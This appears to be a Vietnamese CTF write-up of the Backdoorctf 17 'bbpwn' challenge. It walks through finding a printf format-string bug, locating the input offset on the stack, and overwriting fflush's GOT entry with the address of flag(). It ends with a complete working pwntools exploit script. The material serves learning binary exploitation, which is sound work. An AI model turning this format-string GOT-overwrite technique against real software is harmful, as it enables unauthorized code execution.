## Backdoorctf 17 bbpwn

* Check security
```
 ❯ checksec 32_new
[*] '/mnt/c/Users/levan/OneDrive/Documents/CTF/NightMare/32_new'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
* Chạy file
```
Hello baby pwner, whats your name?
181818
Ok cool, soon we will know whether you pwned it or not. Till then Bye 181818
```
* Mở ida và xem code
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[200]; // [esp+18h] [ebp-200h] BYREF
  char format[300]; // [esp+E0h] [ebp-138h] BYREF
  unsigned int v5; // [esp+20Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);
  fgets(s, 200, edata);
  fflush(edata);
  sprintf(format, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", s);
  fflush(stdout);
  printf(format);
  fflush(stdout);
  exit(1);
}
```
* Ta có thể thấy được bug nằm ở prinf(format) khi nó không kiểm tra đầu vào dẫn đến có thể truyền vào %x hoặc %n để gây ra format string.
* Cũng check được hàm flag(void) là hàm mục tiêu cần truy cập. Địa chỉ của flag() là `0x0804870b`
* Kiểm tra xem đầu vào sẽ nằm ở đâu trên stack, có thể thấy được nó hiển trị ở đầu ra vị trí thứ 11
```
Hello baby pwner, whats your name?
aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Ok cool, soon we will know whether you pwned it or not. Till then Bye aaaa.8048914.ffffca88.f7fc2420.ffffcad4.f7fd3734.f7b43680.ffffcd54.f7d72b34.f7fc2710.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
```
* Chúng ta sẽ dùng %n để ghi đè giá trị lên 1 địa chỉ được trỏ vào, tuy nhiên việc ghi hết 0804870b bytes là rất lớn nên cần chia nhỏ để ghi lần lượt. Chia ra 3 phần gồm 08, 487, 0b. Ta sẽ ghi giá trị đè lên giá trị của hàm fflush. Check được địa chỉ của fflush là
```
 ❯ objdump -R 32_new | grep "fflush"
0804a028 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```
* Như vậy lần đầu tiên ta sẽ ghi vào vào giá trị tại địa chỉ 0x0804a028 (0x0b), lần thứ 2 sẽ là 0x0804a029 (0x4870b), lần thứ 3 là 0x0804a02b (0x0804870b).
* Giá trị hiện tại của fflush
```
gef➤  x/2x 0x0804a028
0x804a028 <fflush@got.plt>:     0x00000052      0xf7a8f510
```
* Như vậy để sửa được 2 bytes cuối ta cần ghi %185x vào địa chỉ 0x0804a028
```
gef➤  x/2x 0x0804a028
0x804a028 <fflush@got.plt>:     0x0000010b      0xf7acd510
```
* Tương tự sẽ là %892x và %129x

* Code đầy đủ
```
from pwn import *
p = process('./32_new')

gdbscript='''
b *0x080487dc
'''
gdb.attach(p, gdbscript=gdbscript)
print(p.recvline())

# Khoi tao dia chi de ghi vao
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

# Khoi tao cac input can thiet
fmt_str0 = b'%10$n'
fmt_str1 = b'%11$n'
fmt_str2 = b'%12$n'

# flag values
flag_0 = b'%185x'
flag_1 = b'%892x'
flag_2 = b'%129x'

payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_0 + fmt_str0 + flag_1 + fmt_str1 + flag_2 + fmt_str2

p.sendline(payload)
p.interactive()
```

